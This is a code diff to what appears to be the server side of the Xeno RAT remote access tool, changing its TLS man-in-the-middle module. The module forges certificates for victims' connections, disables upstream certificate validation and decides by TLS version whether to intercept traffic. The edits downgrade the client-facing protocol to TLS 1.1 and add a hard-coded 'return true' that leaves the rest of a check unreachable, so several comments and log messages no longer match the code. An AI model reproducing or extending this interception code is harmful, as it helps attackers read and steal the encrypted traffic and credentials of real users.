@@ -445,7 +445,7 @@ namespace xeno_rat_server.Forms
 
                 // 4) Decide: if server selected TLS1.3 -> skip MITM (transparent). If server selected TLS1.2 (or probe indicates TLS1.2), perform MITM.
                 // If the probe failed (serverSelectedProtocol == None), be conservative: try transparent fallback.
-                if (serverSelectedProtocol == SslProtocols.Tls13)
+                if (serverSelectedProtocol == SslProtocols.Tls12 || serverSelectedProtocol == SslProtocols.Tls13)
                 {
                     PostUiLocal($"Server selected TLS1.3 for {sni}; skipping MITM and using transparent tunnel.");
                     // Re-play ClientHello to upstream in TransparentTcpTunnel; pass the 'hello' bytes so upstream sees them.
@@ -455,7 +455,7 @@ namespace xeno_rat_server.Forms
                     }
                     return;
                 }
-                else if (serverSelectedProtocol == SslProtocols.Tls12)
+                else if (serverSelectedProtocol <= SslProtocols.Tls11)
                 {
                     PostUiLocal($"Server selected TLS1.2 for {sni}; proceeding with MITM.");
                     using (var prepend = new PrependStream(hello ?? new byte[0], clientNetStream, PostUiLocal))
@@ -1843,6 +1843,7 @@ namespace xeno_rat_server.Forms
             /// </summary>
             private static bool ClientHelloIndicatesTls13(byte[] hello)
             {
+                return true; // remove when you fix MiTM in TLS 1.2
                 if (hello == null || hello.Length < 5) return false;
 
                 try
@@ -2004,7 +2005,7 @@ namespace xeno_rat_server.Forms
                 {
                     clientSsl = new SslStream(clientCombinedStream, leaveInnerStreamOpen: true);
                     await clientSsl.AuthenticateAsServerAsync(leafCert, clientCertificateRequired: false,
-                        enabledSslProtocols: SslProtocols.Tls12 /* limit to TLS1.2 for MITM stability */, checkCertificateRevocation: false).ConfigureAwait(false);
+                        enabledSslProtocols: SslProtocols.Tls11 /* limit to TLS1.2 for MITM stability */, checkCertificateRevocation: false).ConfigureAwait(false);
 
                     _log($"Authenticated to client for {sniHost}. Protocol: {clientSsl.SslProtocol}");
                 }
@@ -2039,7 +2040,7 @@ namespace xeno_rat_server.Forms
                         await remoteTcp.ConnectAsync(sniHost, 443).ConfigureAwait(false);
                         var remoteNet = remoteTcp.GetStream();
                         remoteSsl = new SslStream(remoteNet, leaveInnerStreamOpen: false, userCertificateValidationCallback: (a, b, c, d) => true);
-                        await remoteSsl.AuthenticateAsClientAsync(sniHost, null, SslProtocols.Tls12, false).ConfigureAwait(false);
+                        await remoteSsl.AuthenticateAsClientAsync(sniHost, null, SslProtocols.Tls13 | SslProtocols.Tls12, false).ConfigureAwait(false);
                     }
 
                     _log($"Connected to upstream {sniHost}. Protocol: {remoteSsl.SslProtocol}");
